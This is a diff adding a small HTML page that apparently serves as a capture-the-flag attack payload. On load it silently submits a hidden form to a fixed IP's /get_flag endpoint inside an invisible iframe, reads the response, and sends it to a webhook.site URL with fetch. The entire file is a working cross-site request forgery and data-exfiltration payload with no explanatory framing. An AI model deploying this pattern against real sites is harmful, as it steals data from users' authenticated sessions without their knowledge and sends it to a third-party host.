@@ -1,0 +1,21 @@
+<html>
+  <body>
+    <form id="flagForm" action="http://34.134.162.213:17001/get_flag" method="POST" target="stealth_iframe"></form>
+    <iframe name="stealth_iframe" style="display:none;" onload="exfiltrate()"></iframe>
+
+    <script>
+      function exfiltrate() {
+        try {
+          const data = document.querySelector('iframe').contentDocument.body.innerText;
+          fetch('https://webhook.site/3b7de638-f4eb-4058-808c-c7c5c9d569e5?data=' + encodeURIComponent(data));
+        } catch (e) {
+          // iframe sandboxing might prevent access, try fallback methods here
+        }
+      }
+
+      window.onload = function() {
+        document.getElementById('flagForm').submit();
+      }
+    </script>
+  </body>
+</html>
